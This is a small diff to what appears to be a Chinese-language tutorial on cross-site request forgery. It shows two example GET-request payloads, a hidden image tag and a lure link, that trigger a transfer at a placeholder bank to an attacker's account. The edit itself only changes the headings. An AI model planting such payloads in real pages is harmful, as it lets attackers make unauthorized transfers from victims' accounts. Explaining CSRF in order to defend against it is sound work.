@@ -33,12 +33,12 @@ The URL you are requesting is no longer available
 
 ## 2.GET请求
 
-<img>
+img
 ```javascript
 <img src="http://www.examplebank.com/transfer?amount=1000&toAccount=attacker's-account-number" width="1" height="1" style="visibility:hidden;">
 ```
 
-<a>
+a
 ```javascript
 <a href="http://www.examplebank.com/transfer?amount=1000&toAccount=attacker's-account-number">点击有惊喜!</a>
 ```
